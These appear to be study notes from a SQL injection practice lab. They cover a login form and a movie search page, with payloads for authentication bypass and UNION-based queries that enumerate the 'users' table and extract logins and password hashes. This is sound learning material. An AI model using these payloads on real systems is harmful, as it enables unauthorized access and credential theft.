## SQL injection

### Hero form : 
```
select * from heros where username = ''  AND password = ''
```
Solution : we have to pass the sql to be always true
```
username : 'or '1'='1' # 
 ==> select * from heros where username = ''or '1'='1' # '  AND password = '' ==> true
```
Solution 2
```
username: 'or '1'='1
password: 'or '1'='1
select * from heros where username = ''or '1'='1  AND password = ''or '1'='1' ==> false or true and false or true ==> true and true ==> true
```
### GET/search

#### get all movies

```
select * from movies where name like  '%%'
```
```
Solution
%'or 1=1 # attention a space 
```

#### get password hash of user

```
%'order by 7 # at ==> true ==> 7 columns

%' union select 1,2,3,id,5,6,7 from users # attttt ==> true ==> have table name users
%' union select 1,2,3,group_concat(0x7c,column_name,0x7c),5,6,7 from information_schema.columns where table_name='users' # att ==> get all columns name of the table user 
 --- get result: 
 |id|,|login|,|password|,|email|,|secret|,|activation_code|,|activated|,|reset_code|,|admin|

%' union select 1,2,login,password,5,6,7 from users # att ==> get password hash ! 
```
